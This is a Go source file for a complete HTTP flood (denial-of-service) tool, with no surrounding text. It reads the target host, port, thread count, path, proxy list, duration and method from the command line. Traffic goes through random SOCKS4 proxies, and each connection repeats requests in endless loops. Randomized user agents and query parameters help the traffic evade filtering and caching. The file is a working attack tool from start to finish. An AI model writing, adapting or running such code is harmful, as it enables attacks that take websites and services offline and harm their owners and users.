package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"os"
	"runtime"
	"strconv"
	"time"

	"github.com/gamexg/proxyclient"
)

var (
	chars = "qwertyuiopasdfghjklzxcvbnm1234567890"
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func readLines(fileName string) []string {
	var lines []string
	openFile, _ := os.Open(fileName)
	scanner := bufio.NewScanner(openFile)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines
}

func randomChars() string {
	return string(chars[rand.Intn(len(chars))])
}

func randomIntn() string {
	return strconv.Itoa(rand.Intn(1000))
}

func randomParams() string {
	return "?" + randomChars() + randomIntn() + "=" + randomChars() + randomIntn()
}

func getUserAgent() string {
	osList := []string{
		"iOS",
		"Windows",
		"X11",
		"Android",
	}

	ios := []string{
		"iPhone; CPU iPhone OS 13_3 like Mac OS X",
		"iPad; CPU OS 13_3 like Mac OS X",
		"iPod touch; iPhone OS 4.3.3",
		"iPod touch; CPU iPhone OS 12_0 like Mac OS X",
	}

	android := []string{
		"Linux; Android 4.2.1; Nexus 5 Build/JOP40D",
		"Linux; Android 4.3; MediaPad 7 Youth 2 Build/HuaweiMediaPad",
		"Linux; Android 4.4.2; SAMSUNG GT-I9195 Build/KOT49H",
		"Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T",
		"Linux; Android 5.1.1; vivo X7 Build/LMY47V",
		"Linux; Android 6.0; Nexus 5 Build/MRA58N",
		"Linux; Android 7.0; TRT-LX2 Build/HUAWEITRT-LX2",
		"Linux; Android 8.0.0; SM-N9500 Build/R16NW",
		"Linux; Android 9.0; SAMSUNG SM-G950U",
	}

	windows := []string{
		"Windows NT 10.0; Win64; X64",
		"Windows NT 10.0; WOW64",
		"Windows NT 5.1; rv:7.0.1",
		"Windows NT 6.1; WOW64; rv:54.0",
		"Windows NT 6.3; Win64; x64",
		"Windows NT 6.3; WOW64; rv:13.37",
	}

	x11 := []string{
		"X11; Linux x86_64",
		"X11; Ubuntu; Linux i686",
		"SMART-TV; Linux; Tizen 2.4.0",
		"X11; Ubuntu; Linux x86_64",
		"X11; U; Linux amd64",
		"X11; GNU/LINUX",
		"X11; CrOS x86_64 11337.33.7",
		"X11; Debian; Linux x86_64",
	}
	osName := osList[rand.Intn(len(osList))]
	var version string
	if osName == "iOS" {
		version = ios[rand.Intn(len(ios))]
	}
	if osName == "Android" {
		version = android[rand.Intn(len(android))]
	}
	if osName == "Windows" {
		version = windows[rand.Intn(len(windows))]
	}
	if osName == "X11" {
		version = x11[rand.Intn(len(x11))]
	}
	return "Mozzila 5.0 " + "(" + version + ")" + " AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + strconv.Itoa(rand.Intn(91-60)+60) + ".0." + strconv.Itoa(rand.Intn(5000-4000)+4000) + "." + strconv.Itoa(rand.Intn(60-40)+40) + " Safari/537.36"
}

func getUserAgents(number int) []string {
	var userAgents []string
	for i := 0; i < number; i++ {
		userAgents = append(userAgents, getUserAgent())
	}
	return userAgents
}

func makeRequests(_HOST string, _PORT string, _USERAGENT string, _PROXY string, _PATH string, _METHOD string) {
	var conn net.Conn
	_HEADER := _METHOD + " " + _PATH + randomParams() + " HTTP/1.1\r\nHost: " + _HOST + "\r\nConnection: Keep-Alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-encoding: gzip, deflate, br\r\nReferer: https://www.google.com/\r\nUser-Agent: " + _USERAGENT + "\r\n\r\n"
	_ADDRESS := _HOST + ":" + _PORT
	// Dialer
	dialer, err := proxyclient.NewProxyClient("socks4://" + _PROXY)
	if err != nil {
		return
	}
	// Connect
	conn, err = dialer.DialTimeout("tcp", _ADDRESS, 5*time.Second)
	if _PORT == "443" {
		conn = tls.Client(conn, &tls.Config{
			ServerName:         _HOST,
			InsecureSkipVerify: true,
		})
	}
	if err != nil {
		return
	}
	defer conn.Close()
	for i := 0; i < 100; i++ {
		conn.Write([]byte(_HEADER))
	}
}

func prepareRequests(_HOST string, _PORT string, _USERAGENTS []string, _PROXIES []string, _PATH string, _METHOD string) {
	_USERAGENT := _USERAGENTS[rand.Intn(len(_USERAGENTS))]
	_PROXY := _PROXIES[rand.Intn(len(_PROXIES))]
	for {
		makeRequests(_HOST, _PORT, _USERAGENT, _PROXY, _PATH, _METHOD)
	}
}

func main() {
	runtime.GOMAXPROCS(4)
	_USERAGENTS := getUserAgents(500)
	_HOST := os.Args[1]
	_PORT := os.Args[2]
	_THREADS, _ := strconv.Atoi(os.Args[3])
	_PATH := os.Args[4]
	_FILE := os.Args[5]
	_PROXIES := readLines(_FILE)
	_TIME, _ := strconv.Atoi(os.Args[6])
	_METHOD := os.Args[7]
	fmt.Print("Target: " + _HOST + "\n" + "Port: " + _PORT + "\n" + "Method: " + _METHOD + "\n" + "Threads: " + strconv.Itoa(_THREADS) + "\n" + "Time: " + strconv.Itoa(_TIME) + "\n")
	for i := 0; i < _THREADS; i++ {
		go prepareRequests(_HOST, _PORT, _USERAGENTS, _PROXIES, _PATH, _METHOD)
	}
	time.Sleep(time.Duration(_TIME) * time.Second)
}
